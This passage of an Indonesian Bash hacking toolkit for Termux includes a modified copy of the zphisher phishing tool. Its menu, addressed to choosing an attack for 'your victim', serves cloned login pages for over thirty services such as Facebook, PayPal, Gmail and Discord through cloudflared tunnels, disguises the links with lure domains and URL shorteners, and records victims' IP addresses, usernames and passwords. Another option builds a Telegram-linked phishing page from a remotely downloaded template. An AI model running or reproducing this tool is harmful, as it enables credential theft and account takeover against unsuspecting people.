echo -e "${GREEN}✅ [$total] Sukses ke @$user: \"$pesan\"${RESET}"
else
((gagal++))
gagal_list+=("[$total] @$user: $pesan (Status: $response)")
echo -e "${RED}❌ [$total] Gagal ke @$user: \"$pesan\" (Status: $response)${RESET}"
fi
done
e "${ran5}Tekan 'q' untuk stop "
read -t 0.1 -n 1 key
if [[ "$key" == "q" ]]; then
echo "Loop dihentikan..."
stty sane
echo -ne "\r${CYAN}📊 RINGKASAN PENGIRIMAN:${RESET}"
echo -e "${GREEN}✔️ Berhasil: $berhasil${RESET}"
echo -e "${RED}❌ Gagal: $gagal${RESET}"
echo -e "${YELLOW}📦 Total: $total${RESET}"
echo
if [[ $berhasil -gt 0 ]]; then
echo -e "${GREEN}✅ Daftar pesan berhasil:${RESET}"
for msg in "${berhasil_list[@]}"; do
echo -e "   ${GREEN}$msg${RESET}"
done
fi
if [[ $gagal -gt 0 ]]; then
echo -e "${RED}❌ Daftar pesan gagal:${RESET}"
for msg in "${gagal_list[@]}"; do
echo -e "   ${RED}$msg${RESET}"
done
fi
echo
echo -e "${BLUE}🔚 ENTER untuk kembali ke menu${RESET}"
read
break
fi
done
;;
*)
echo -e "${RED}✖ Pilihan tidak valid.${RESET}"
sleep 5
;;
esac
done
elif [[ $no == "bk" || $no == "BK" ]]; then
break
elif [ "$no" = "0" ]; then
touch $PREFIX/tmp/.tools
play -q $HOME/Lubeban/sound/klik.mp3 &> /dev/null
kill_sound &> /dev/null &
cd $HOME
isipesan="Terdeteksi Keluar Dari TOOLSV5 !  💻"
telegram &> /dev/null &
exit 0
else
play -q $HOME/Lubeban/sound/salah.mp3 &> /dev/null &
e $bg_m "YAH TOOLSV5 BINGGUNG APA YANG ANDA PILIH !$res "
play -q $HOME/Lubeban/sound/input_salah.mp3 &> /dev/null &
sleep 5
fi
done
elif [[ $no == "all" || $no == "ALL" ]]; then
while true; do
isipesan="Terdeteksi login Hack / Phising !  💻"
telegram &> /dev/null &
TAMPILANTOOLSV5
PHISING
READ
cek_akses
if [ "$no" = "10" ]; then
clear
$GALIRUS update -y && $GALIRUS upgrade -y
if ! command -v python &> /dev/null; then
$GALIRUS install -y python
fi
if ! command -v pip &> /dev/null; then
$GALIRUS install -y python-pip
fi
if ! command -v cloudflared &> /dev/null; then
$GALIRUS install -y cloudflared
fi
$e "${h}[ + ] Semua dependensi terpasang, lanjut ke script utama...${p}"
baner() {
$e "
${p}⠀⠀⠀⢠⣾⣷⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⣰⣿⣿⣿⣿⣷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⢰⣿⣿⣿⣿⣿⣿⣷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣤⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣤⣄⣀⣀⣤⣤⣶⣾⣿⣿⣿⡷
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠁
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠁⠀
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠏⠀⠀⠀
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠏⠀⠀⠀⠀
⣿⣿⣿⡇${m}⠀⡾${p}⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠁⠀⠀⠀⠀⠀
⣿⣿⣿⣧${m}⡀⠁${p}⣀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠉${b}⢹${p}⠉⠙⣿⣿⣿⣿⣿⠀⠀
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣀⠀⣀⣼⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠀${ran7} TOOLSV5 X GALIRUS OFFICIAL${p}
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠛⠁⠀    ${ran}PHISING BUG WHATSAPP VIA TELE${p}⠀⠀⠀⠀⠀⠀
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠛⠀⠤⢀⡀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀
⣿⣿⣿⣿⠿⣿⣿⣿⣿⣿⣿⣿⠿⠋⢃⠈⠢⡁⠒⠄⡀⠈⠁⠀${ran3}⠀⠀Thanks to the members of toolsv5 ${p}⠀⠀⠀⠀
⣿⣿⠟⠁⠀⠀⠈⠉⠉⠁⠀⠀⠀⠀⠈⠆⠀⠀⠀⠀⠀⠀⠀⠀⠀${ran3}⠀who are willing to provide this script.${p}⠀⠀⠀⠀
⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠀
"
}
GALIRUS="1912"
dir="$PREFIX/phising_bug"
mkdir -p "$dir"
cd "$dir" || {
$e "${m}[ ! ] Gagal masuk ke direktori $dir${p}"
exit 1
}
curl -sL -o "template.html" "https://kontollukecilkocak.vercel.app/template.html"
clear
$e "\r${p}"
baner | boxes -d ansi-rounded
$e "[ ${c}+${p} ] Masukkan Bot Tele Anda: "
read -r TOKENTELE
$e "[ ${c}+${p} ] Chat ID: "
read -r CHATID
sed -e "s/{{TOKEN}}/$TOKENTELE/" -e "s/{{CHATID}}/$CHATID/" template.html > "index.html"
clear
baner | boxes -d ansi-rounded
$e "[ ${g}!${p} ] File ${bl}index.html${p} berhasil dibuat"
$e "[ ${g}!${p} ] Detail yang anda masukkan: ${bl}$TOKENTELE${p} dan ${bl}$CHATID${p}."
python -m http.server $GALIRUS &> /dev/null &
YAMETEH=$!
cloudflared tunnel --url "http://localhost:$GALIRUS" > "cloudflared_url.log" 2>&1 &
CF_PID=$!
sleep 8
send_link=$(grep -o "https://[-0-9a-z]*\.trycloudflare.com" "cloudflared_url.log")
while true; do
clear
baner | boxes -d ansi-rounded
if [ -z "$send_link" ]; then
$e "${m}[ ! ] Gagal membuat terowongan Cloudflared${p}"
send_link="http://localhost:$GALIRUS"
else
$e "${h}[ + ] Terowongan berhasil dibuat!${p}"
fi
$e "\n${k}[ + ] URL Publik:${p} ${bl}$send_link${p}\n"
echo -ne "\r${or}Tekan 'q' untuk stop ${p}"
read -t 1 -n 1 key
if [[ "$key" == "q" ]]; then
echo "" > "$dir/template.html"
echo "" > "$dir/index.html"
if kill -0 $YAMETEH 2> /dev/null; then
kill $YAMETEH && $e "\n[ ! ] Server Sudah Di hentikan" || $e "\n[ ! ] Gagal menghentikan server"
else
$e "[ i ] Server sudah tidak berjalan"
fi
if kill -0 $CF_PID 2> /dev/null; then
kill $CF_PID && $e "\n[ ! ] Url Public Sudah Di matikan" || $e "\n[ ! ] Gagal menghentikan url public"
else
$e "[ i ] Url Public sudah tidak berjalan"
fi
break
fi
done
elif [ "$no" = "11" ]; then
while true; do
tempat="$PREFIX/lib/CHATAPP"
if [ -d "$tempat" ]; then
cd $HOME/chat
git pull origin main
git stash
cd $tempat
npm start
rm -rf $tempat
break 2
else
cd $HOME
git clone https://github.com/Lubebansokhekel/chat
cd chat
git pull origin main
git stash
$GALIRUS install nodejs yarn openssl -y
mv -f CHATAPP.sh "$PREFIX/lib/"
cd "$PREFIX/lib"
openssl enc -d -aes-256-cbc -pbkdf2 -in CHATAPP.sh -pass pass:CHATAPP_BETA | tar xz
fi
done
elif [ "$no" = "12" ]; then
while true; do
nexphisher="$PREFIX/opt/zphisher"
if [ -d "$nexphisher" ]; then
e $k "Membuka TOOLS"
sleep 5
cd $nexphisher
__version__="5.0.1 ALPHA"
RED="$(printf '\033[31m')" GREEN="$(printf '\033[32m')" ORANGE="$(printf '\033[33m')" BLUE="$(printf '\033[34m')"
MAGENTA="$(printf '\033[35m')" CYAN="$(printf '\033[36m')" WHITE="$(printf '\033[37m')" BLACK="$(printf '\033[30m')"
REDBG="$(printf '\033[41m')" GREENBG="$(printf '\033[42m')" ORANGEBG="$(printf '\033[43m')" BLUEBG="$(printf '\033[44m')"
MAGENTABG="$(printf '\033[45m')" CYANBG="$(printf '\033[46m')" WHITEBG="$(printf '\033[47m')" BLACKBG="$(printf '\033[40m')"
RESETBG="$(printf '\e[0m\n')"
if [[ ! -d ".server" ]]; then
mkdir -p ".server"
fi
if [[ ! -d "auth" ]]; then
mkdir -p "auth"
fi
if [[ -d ".server/www" ]]; then
rm -rf ".server/www"
mkdir -p ".server/www"
else
mkdir -p ".server/www"
fi
if [[ -e ".server/.loclx" ]]; then
rm -rf ".server/.loclx"
fi
if [[ -e ".server/.cld.log" ]]; then
rm -rf ".server/.cld.log"
fi
exit_on_signal_SIGINT() {
{
printf "\n\n%s\n\n" "${RED}[${WHITE}!${RED}]${RED} Program Interrupted." 2>&1
reset_color
}
}
exit_on_signal_SIGTERM() {
{
printf "\n\n%s\n\n" "${RED}[${WHITE}!${RED}]${RED} Program Terminated." 2>&1
reset_color
}
}
reset_color() {
tput sgr0 # reset attributes
tput op   # reset color
return
}
kill_pid() {
check_PID="php ngrok cloudflared loclx"
for process in ${check_PID}; do
if [[ $(pidof ${process}) ]]; then     # Check for Process
killall ${process} > /dev/null 2>&1 # Kill the Process
fi
done
}
banner() {
cat <<- EOF
${ORANGE}
${ORANGE} ______      _     _     _
${ORANGE}|___  /     | |   (_)   | |
${ORANGE}   / / _ __ | |__  _ ___| |__   ___ _ __
${ORANGE}  / / | '_ \| '_ \| / __| '_ \ / _ \ '__|
${ORANGE} / /__| |_) | | | | \__ \ | | |  __/ |
${ORANGE}/_____| .__/|_| |_|_|___/_| |_|\___|_|
${ORANGE}      | |
${ORANGE}      |_|                ${RED}Version : ${__version__}
${GREEN}[${WHITE}-${GREEN}]${CYAN} Tools Yang Di Kembangkan oleh (GALIRUS)${WHITE}
EOF
}
banner_small() {
cat <<- EOF
${BLUE}
${BLUE}  ░▀▀█░█▀█░█░█░▀█▀░█▀▀░█░█░█▀▀░█▀▄
${BLUE}  ░▄▀░░█▀▀░█▀█░░█░░▀▀█░█▀█░█▀▀░█▀▄
${BLUE}  ░▀▀▀░▀░░░▀░▀░▀▀▀░▀▀▀░▀░▀░▀▀▀░▀░▀${WHITE} ${__version__}
EOF
}
dependencies() {
echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing required packages..."
if [[ -d "/data/data/com.termux/files/home" ]]; then
if [[ ! $(command -v proot) ]]; then
echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing package : ${ORANGE}proot${CYAN}"${WHITE}
$GALIRUS install proot resolv-conf -y
fi
if [[ ! $(command -v tput) ]]; then
echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing package : ${ORANGE}ncurses-utils${CYAN}"${WHITE}
$GALIRUS install ncurses-utils -y
fi
fi
if [[ $(command -v php) && $(command -v curl) && $(command -v unzip) ]]; then
echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Packages already installed."
else
pkgs=(php cloudflared curl unzip)
for pkg in "${pkgs[@]}"; do
type -p "$pkg" &> /dev/null || {
echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing package : ${ORANGE}$pkg${CYAN}"${WHITE}
if [[ $(command -v pkg) ]]; then
pkg install "$pkg" -y
elif [[ $(command -v apt) ]]; then
sudo apt install "$pkg" -y
elif [[ $(command -v apt-get) ]]; then
sudo apt-get install "$pkg" -y
elif [[ $(command -v pacman) ]]; then
sudo pacman -S "$pkg" --noconfirm
elif [[ $(command -v dnf) ]]; then
sudo dnf -y install "$pkg"
elif [[ $(command -v yum) ]]; then
sudo yum -y install "$pkg"
elif [[ $(command -v cloudflared) ]]; then
sudo cloudflared -y install "$pkg"
else
echo -e "\n${RED}[${WHITE}!${RED}]${RED} Unsupported package manager, Install packages manually."
{
reset_color
exit 1
}
fi
}
done
fi
}
msg_exit() {
{
clear
banner
echo
}
echo -e "${GREENBG}${BLACK}
Terima kasih telah menggunakan alat ini.
Semoga hari Anda menyenangkan.${RESETBG}\n"
{
reset_color
while true; do
sleel 5
break 1
done
}
}
about() {
{
clear
banner
echo
}
cat <<- EOF
${GREEN} Author   ${RED}:  ${ORANGE}TAHMID RAYAT ${RED}[ ${ORANGE}HTR-TECH ${RED}]
${GREEN} Revisi   ${RED}:  ${ORANGE} GALIRUS OFFICIAL
${GREEN} Github   ${RED}:  ${CYAN}https://github.com/Lubebansokhekel
${GREEN} Version  ${RED}:  ${ORANGE}${__version__}
${WHITE} ${REDBG}Peringatan:${RESETBG}
${CYAN}  Alat ini dibuat untuk tujuan pendidikan saja ${RED}!${WHITE}${CYAN}
Penulis tidak bertanggung jawab atas penyalahgunaan
Toolkit ini${RED}!${WHITE}
${WHITE} ${CYANBG}Special Thanks to:${RESETBG}
${GREEN}  1RaY-1, Adi1090x, AliMilani, BDhackers009,
KasRoudra, sepp0, ThelinuxChoice, Yisus7u7, Galirus_Official
${RED}[${WHITE}00${RED}]${ORANGE} Main Menu     ${RED}[${WHITE}99${RED}]${ORANGE} Exit
EOF
IFS= read -r -e -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"
case $REPLY in
99)
msg_exit
;;
0 | 00)
echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Returning to main menu..."
{
sleep 1
main_menu
}
;;
*)
echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
{
sleep 1
about
}
;;
esac
}
HOST='127.0.0.1'
PORT=$(shuf -i 1000-9999 -n 1)
cusport() {
echo ""
read -n1 -p "${RED}[${WHITE}?${RED}]${ORANGE} Apakah Anda Ingin Port Kustom? ${GREEN}[${CYAN}y${GREEN}/${CYAN}N${GREEN}]: ${ORANGE}" P_ANS
if [[ ${P_ANS} =~ ^([yY])$ ]]; then
printf "\n\n"
read -n4 -p "${RED}[${WHITE}-${RED}]${ORANGE}Masukkan Port Kustom 4 Digit Anda 1024-9999 : ${WHITE}" CU_P
if [[ ! -z ${CU_P} && "${CU_P}" =~ ^([1-9][0-9][0-9][0-9])$ && ${CU_P} -ge 1024 ]]; then
PORT=${CU_P}
echo ""
else
echo -ne "\n\n${RED}[${WHITE}!${RED}]${RED} Invalid 4-digit Port : $CU_P, Try Again...${WHITE}"
{
sleep 2
clear
banner
cusport
}
fi
elif [[ ${P_ANS} =~ ^([Nn])$ ]]; then
echo -ne "\n\n${RED}[${WHITE}-${RED}]${BLUE} Using Default Port : $PORT...${WHITE}"
echo ""
else
echo ""
echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again...${WHITE}"
cusport
fi
}
setup_site() {
echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Menyiapkan server..."${WHITE}
cp -rf .sites/"$website"/* .server/www
cp -f .sites/ip.php .server/www/
echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} Menjalankan server PHP..."${WHITE}
cd .server/www && php -S "$HOST":"$PORT" > /dev/null 2>&1 &
}
capture_ip() {
IP=$(grep -a 'IP:' .server/www/ip.txt | cut -d " " -f2 | tr -d '\r')
IFS=$'\n'
echo -e "\n${RED}┌───[${WHITE}+${RED}]${GREEN} Alamat IP Terdeteksi!"
echo -e "${RED}│"
printf "${RED}├───[${WHITE}•${RED}]${GREEN} Alamat IP     : ${BLUE}%-20s\n" "$IP"
echo -e "${RED}├───[${WHITE}•${RED}]${GREEN} Disimpan di   : ${ORANGE}auth/ip.txt"
echo -e "${RED}└──────────────────────────────────────────────"
cat .server/www/ip.txt >> auth/ip.txt
}
capture_creds() {
ACCOUNT=$(grep -o 'Username:.*' .server/www/usernames.txt | awk '{print $2}')
PASSWORD=$(grep -o 'Pass:.*' .server/www/usernames.txt | awk -F ":." '{print $NF}')
IFS=$'\n'
echo -e "\n${RED}┌───[${WHITE}+${RED}]${GREEN} Kredensial Ditemukan!"
echo -e "${RED}│"
printf "${RED}├───[${WHITE}•${RED}]${GREEN} Username      : ${BLUE}%-20s\n" "$ACCOUNT"
printf "${RED}├───[${WHITE}•${RED}]${GREEN} Password      : ${BLUE}%-20s\n" "$PASSWORD"
echo -e "${RED}├───[${WHITE}•${RED}]${GREEN} Disimpan di   : ${ORANGE}auth/usernames.dat"
echo -e "${RED}└──────────────────────────────────────────────"
cat .server/www/usernames.txt >> auth/usernames.dat
echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Menunggu login berikutnya, tekan ${BLUE}q lalu enter ${ORANGE}untuk berhenti...\n"
}
capture_data() {
banner
echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Pemantauan aktivitas login...\n"
echo -ne "${BLUE}(Ketik q lalu Enter kapan saja untuk keluar)\n\n"
while true; do
if [[ -e ".server/www/ip.txt" ]]; then
echo -e "\n${RED}[${WHITE}!${RED}]${GREEN} IP baru terdeteksi!"
capture_ip
rm -rf .server/www/ip.txt
fi
if [[ -e ".server/www/usernames.txt" ]]; then
echo -e "\n${RED}[${WHITE}!${RED}]${GREEN} Kredensial diterima!"
capture_creds
rm -rf .server/www/usernames.txt
fi
read -t 1 input
[[ $input == "q" ]] && break 4
sleep 0.5
done
}
start_cloudflared() {
rm .cld.log > /dev/null 2>&1 &
cusport
echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
{
sleep 1
setup_site
}
echo -ne "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching Cloudflared...\n\n"
echo -ne "\e${WHITE}[${GREEN} +${WHITE} ]${GREEN} Starting Cloudflared...\e[0m\n"
php -S localhost:$PORT > /dev/null 2>&1 &
sleep 3
cloudflared tunnel --url http://localhost:$PORT --protocol http2 > sendlink 2>&1 &
sleep 8
send_link=$(grep -o "https://[-0-9a-z]*\.trycloudflare.com" sendlink)
{
clear
banner_small
}
CUTTLY_API_KEY="${shortlink}"
shortlink() {
local LONG_URL="$1"
if [ -z "$LONG_URL" ]; then
echo "❌ Usage: shortlink \"url\""
return 1
fi
local cuttly_response
cuttly_response=$(curl -s -G "https://cutt.ly/api/api.php" \
--data-urlencode "key=$CUTTLY_API_KEY" \
--data-urlencode "short=$LONG_URL")
local cuttly_link
cuttly_link=$(echo "$cuttly_response" | grep -oP '"shortLink":\s*"\K[^"]+' | sed 's#\\##g')
if [ -n "$cuttly_link" ]; then
echo "$cuttly_link"
else
echo "$LONG_URL"
fi
}
cldflr_link="$send_link"
cldflr_link1=${cldflr_link#https://}
short_send_link=$(shortlink "$cldflr_link")
echo -e "\n\n${GREEN}Silahkan Anda Copy Karena Setelah Enter Url Akan Hilang${RED}!"
echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 1 : ${GREEN}$cldflr_link"
echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 2 : ${GREEN}$mask@$cldflr_link1${BLUE}"
echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 3 : ${GREEN}$short_send_link${BLUE}"
IFS= read -r -e -p "Silahlan Enter Jika Sudah Coppy URL"
clear
capture_data
}
tunnel_menu() {
{
clear
banner_small
}
start_cloudflared
}
site_facebook() {
cat <<- EOF
${RED}[${WHITE}01${RED}]${ORANGE} Halaman Login Tradisional
${RED}[${WHITE}02${RED}]${ORANGE} Halaman Login Voting Canggih
${RED}[${WHITE}03${RED}]${ORANGE} Halaman Login Keamanan Palsu
${RED}[${WHITE}04${RED}]${ORANGE} Halaman Login Messenger Facebook
EOF
IFS= read -r -e -p "${RED}[${WHITE}-${RED}]${GREEN} Pilih salah satu opsi : ${BLUE}"
case $REPLY in
1 | 01)
website="facebook"
mask='https://m.facebook.com'
tunnel_menu
;;
2 | 02)
website="fb_advanced"
mask='http://vote-for-the-best-social-media'
tunnel_menu
;;
3 | 03)
website="fb_security"
mask='http://make-your-facebook-secured-and-free-from-hackers'
tunnel_menu
;;
4 | 04)
website="fb_messenger"
mask='http://get-messenger-premium-features-free'
tunnel_menu
;;
*)
echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Opsi tidak valid, silakan coba lagi..."
{
sleep 1
clear
banner_small
site_facebook
}
;;
esac
}
site_instagram() {
cat <<- EOF
${RED}[${WHITE}01${RED}]${ORANGE} Halaman Login Tradisional
${RED}[${WHITE}02${RED}]${ORANGE} Halaman Login Auto Followers
${RED}[${WHITE}03${RED}]${ORANGE} Halaman Login 1000 Followers
${RED}[${WHITE}04${RED}]${ORANGE} Halaman Login Verifikasi Lencana Biru
EOF
IFS= read -r -e -p "${RED}[${WHITE}-${RED}]${GREEN} Pilih salah satu opsi : ${BLUE}"
case $REPLY in
1 | 01)
website="instagram"
mask='http://get-unlimited-followers-for-instagram'
tunnel_menu
;;
2 | 02)
website="ig_followers"
mask='http://get-unlimited-followers-for-instagram'
tunnel_menu
;;
3 | 03)
website="insta_followers"
mask='http://get-1000-followers-for-instagram'
tunnel_menu
;;
4 | 04)
website="ig_verify"
mask='http://blue-badge-verify-for-instagram-free'
tunnel_menu
;;
*)
echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Opsi tidak valid, silakan coba lagi..."
{
sleep 1
clear
banner_small
site_instagram
}
;;
esac
}
site_gmail() {
cat <<- EOF
${RED}[${WHITE}01${RED}]${ORANGE} Halaman Login Gmail Lama
${RED}[${WHITE}02${RED}]${ORANGE} Halaman Login Gmail Baru
${RED}[${WHITE}03${RED}]${ORANGE} Halaman Voting Canggih
EOF
IFS= read -r -e -p "${RED}[${WHITE}-${RED}]${GREEN} Pilih salah satu opsi : ${BLUE}"
case $REPLY in
1 | 01)
website="google"
mask='http://get-unlimited-google-drive-free'
tunnel_menu
;;
2 | 02)
website="google_new"
mask='http://get-unlimited-google-drive-free'
tunnel_menu
;;
3 | 03)
website="google_poll"
mask='http://vote-for-the-best-social-media'
tunnel_menu
;;
*)
echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Opsi tidak valid, silakan coba lagi..."
{
sleep 1
clear
banner_small
site_gmail
}
;;
esac
}
site_vk() {
cat <<- EOF
${RED}[${WHITE}01${RED}]${ORANGE} Halaman Login Tradisional
${RED}[${WHITE}02${RED}]${ORANGE} Halaman Login Voting Canggih
EOF
IFS= read -r -e -p "${RED}[${WHITE}-${RED}]${GREEN} Pilih salah satu opsi : ${BLUE}"
case $REPLY in
1 | 01)
website="vk"
mask='http://vk-premium-real-method-2020'
tunnel_menu
;;
2 | 02)
website="vk_poll"
mask='http://vote-for-the-best-social-media'
tunnel_menu
;;
*)
echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Opsi tidak valid, silakan coba lagi..."
{
sleep 1
clear
banner_small
site_vk
}
;;
esac
}
main_menu() {
{
clear
banner
echo
}
cat <<- EOF
${RED}[${WHITE}::${RED}]${ORANGE} Pilih Serangan Untuk Korban Anda ${RED}[${WHITE}::${RED}]${ORANGE}
${RED}[${WHITE}01${RED}]${ORANGE} Facebook      ${RED}[${WHITE}11${RED}]${ORANGE} Twitch       ${RED}[${WHITE}21${RED}]${ORANGE} DeviantArt
${RED}[${WHITE}02${RED}]${ORANGE} Instagram     ${RED}[${WHITE}12${RED}]${ORANGE} Pinterest    ${RED}[${WHITE}22${RED}]${ORANGE} Badoo
${RED}[${WHITE}03${RED}]${ORANGE} Google        ${RED}[${WHITE}13${RED}]${ORANGE} Snapchat     ${RED}[${WHITE}23${RED}]${ORANGE} Origin
${RED}[${WHITE}04${RED}]${ORANGE} Microsoft     ${RED}[${WHITE}14${RED}]${ORANGE} Linkedin     ${RED}[${WHITE}24${RED}]${ORANGE} DropBox
${RED}[${WHITE}05${RED}]${ORANGE} Netflix       ${RED}[${WHITE}15${RED}]${ORANGE} Ebay         ${RED}[${WHITE}25${RED}]${ORANGE} Yahoo
${RED}[${WHITE}06${RED}]${ORANGE} Paypal        ${RED}[${WHITE}16${RED}]${ORANGE} Quora        ${RED}[${WHITE}26${RED}]${ORANGE} Wordpress
${RED}[${WHITE}07${RED}]${ORANGE} Steam         ${RED}[${WHITE}17${RED}]${ORANGE} Protonmail   ${RED}[${WHITE}27${RED}]${ORANGE} Yandex
${RED}[${WHITE}08${RED}]${ORANGE} Twitter       ${RED}[${WHITE}18${RED}]${ORANGE} Spotify      ${RED}[${WHITE}28${RED}]${ORANGE} StackoverFlow
${RED}[${WHITE}09${RED}]${ORANGE} Playstation   ${RED}[${WHITE}19${RED}]${ORANGE} Reddit       ${RED}[${WHITE}29${RED}]${ORANGE} Vk
${RED}[${WHITE}10${RED}]${ORANGE} Tiktok        ${RED}[${WHITE}20${RED}]${ORANGE} Adobe        ${RED}[${WHITE}30${RED}]${ORANGE} XBOX
${RED}[${WHITE}31${RED}]${ORANGE} Mediafire     ${RED}[${WHITE}32${RED}]${ORANGE} Gitlab       ${RED}[${WHITE}33${RED}]${ORANGE} Github
${RED}[${WHITE}34${RED}]${ORANGE} Discord
${RED}[${WHITE}99${RED}]${ORANGE} About         ${RED}[${WHITE}00${RED}]${ORANGE} Exit
EOF
IFS= read -r -e -p "${RED}[${WHITE}-${RED}]${GREEN} Pilih opsi : ${BLUE}"
case $REPLY in
1 | 01)
site_facebook
;;
2 | 02)
site_instagram
;;
3 | 03)
site_gmail
;;
4 | 04)
website="microsoft"
mask='https://www.microsoft.com'
tunnel_menu
;;
5 | 05)
website="netflix"
mask='https://www.netflix.com'
tunnel_menu
;;
6 | 06)
website="paypal"
mask='https://www.paypal.com'
tunnel_menu
;;
7 | 07)
website="steam"
mask='https://store.steampowered.com'
tunnel_menu
;;
8 | 08)
website="twitter"
mask='https://twitter.com'
tunnel_menu
;;
9 | 09)
website="playstation"
mask='https://www.playstation.com'
tunnel_menu
;;
10)
website="tiktok"
mask='https://www.tiktok.com'
tunnel_menu
;;
11)
website="twitch"
mask='https://www.twitch.tv'
tunnel_menu
;;
12)
website="pinterest"
mask='https://www.pinterest.com'
tunnel_menu
;;
13)
website="snapchat"
mask='https://www.snapchat.com'
tunnel_menu
;;
14)
website="linkedin"
mask='https://www.linkedin.com'
tunnel_menu
;;
15)
website="ebay"
mask='https://www.ebay.com'
tunnel_menu
;;
16)
website="quora"
mask='https://www.quora.com'
tunnel_menu
;;
17)
website="protonmail"
mask='https://mail.proton.me'
tunnel_menu
;;
18)
website="spotify"
mask='https://www.spotify.com'
tunnel_menu
;;
19)
website="reddit"
mask='https://www.reddit.com'
tunnel_menu
;;
20)
website="adobe"
mask='https://www.adobe.com'
tunnel_menu
;;
21)
website="deviantart"
mask='https://www.deviantart.com'
tunnel_menu
;;
22)
website="badoo"
mask='https://badoo.com'
tunnel_menu
;;
23)
website="origin"
mask='https://www.origin.com'
tunnel_menu
;;
24)
website="dropbox"
mask='https://www.dropbox.com'
tunnel_menu
;;
25)
website="yahoo"
mask='https://mail.yahoo.com'
tunnel_menu
;;
26)
website="wordpress"
mask='https://wordpress.com'
tunnel_menu
;;
27)
website="yandex"
mask='https://mail.yandex.com'
tunnel_menu
;;
28)
website="stackoverflow"
mask='https://stackoverflow.com'
tunnel_menu
;;
29)
site_vk
;;
30)
website="xbox"
mask='https://www.xbox.com'
tunnel_menu
;;
31)
website="mediafire"
mask='https://www.mediafire.com'
tunnel_menu
;;
32)
website="gitlab"
mask='https://gitlab.com'
tunnel_menu
;;
33)
website="github"
mask='https://github.com'
tunnel_menu
;;
34)
website="discord"
mask='https://discord.com'
tunnel_menu
;;
99)
about
;;
0 | 00)
msg_exit
;;
*)
echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Opsi Tidak Valid, Coba Lagi..."
{
sleep 1
main_menu
}
;;
esac
}
kill_pid
dependencies
main_menu
break
else
play -q $HOME/Lubeban/sound/salah.mp3 &> /dev/null &
e $k "Menginstall package$h "
cd $PREFIX
mkdir opt
cd opt
$paket install -y tur-repo
git clone --depth=32 https://github.com/Lubebansokhekel/zphisher
fi
done
e "$k"
elif [ "$no" = "ngrok" ]; then
while true; do
clear
ngrok="$DIR_SAVE/ngrok"
if [ -d "$ngrok" ]; then
cd $ngrok
clear
cowsay -f eyes "Hello Boy ! Anda Berada Di Ngrok" | lolcat
echo
e $k "Mau Menggunakan Metode Apa ? http / tcp ? "
IFS= read -r -e -p "G404☠️localhost ( http - tcp ) : " manakocak
play -q $HOME/Lubeban/sound/klik.mp3 &> /dev/null &
clear
cowsay -f eyes "Hello Boy ! Anda Berada Di Ngrok" | lolcat
echo
e $k "Mau Pake Port Apa ?$m contoh:$h 8080"
IFS= read -r -e -p "G404☠️localhost : " port
clear
